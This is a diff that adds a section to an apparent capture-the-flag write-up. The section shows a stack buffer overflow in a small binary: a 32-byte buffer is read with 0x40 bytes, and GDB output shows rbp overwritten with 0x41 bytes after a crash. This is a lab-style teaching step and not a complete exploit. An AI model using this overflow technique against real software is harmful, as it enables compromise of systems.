@@ -54,3 +54,38 @@ undefined8 main(void)
 ```
 This is the main funtion 
 We can see that there is an array of 32 elements <code> local_28 [32] </code> that can take an input of some data <code> read(0,local_28,0x40); </code>
+Now it's time to use this array to overflow and overwrite the ebp register.
+Let's look it into GDB.
+```
+We have just fixed the plumbing systm, let's hope there's no leaks!
+>.> aaaaah shiiit wtf is dat address doin here...  0x7fffffffe010
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000555555555295 in main ()
+(gdb) info registers
+rax            0x0                 0
+rbx            0x0                 0
+rcx            0x7ffff7bb3e2e      140737349631534
+rdx            0x40                64
+rsi            0x7fffffffe010      140737488347152
+rdi            0x0                 0
+rbp            0x4141414141414141  0x4141414141414141
+rsp            0x7fffffffe038      0x7fffffffe038
+r8             0x0                 0
+r9             0x7fffffffde00      140737488346624
+r10            0xfffffffffffff286  -3450
+r11            0x246               582
+r12            0x5555555550a0      93824992235680
+r13            0x0                 0
+r14            0x0                 0
+r15            0x0                 0
+rip            0x555555555295      0x555555555295 <main+252>
+eflags         0x10246             [ PF ZF IF RF ]
+cs             0x33                51
+ss             0x2b                43
+ds             0x0                 0
+es             0x0                 0
+fs             0x0                 0
+gs             0x0                 0
+```
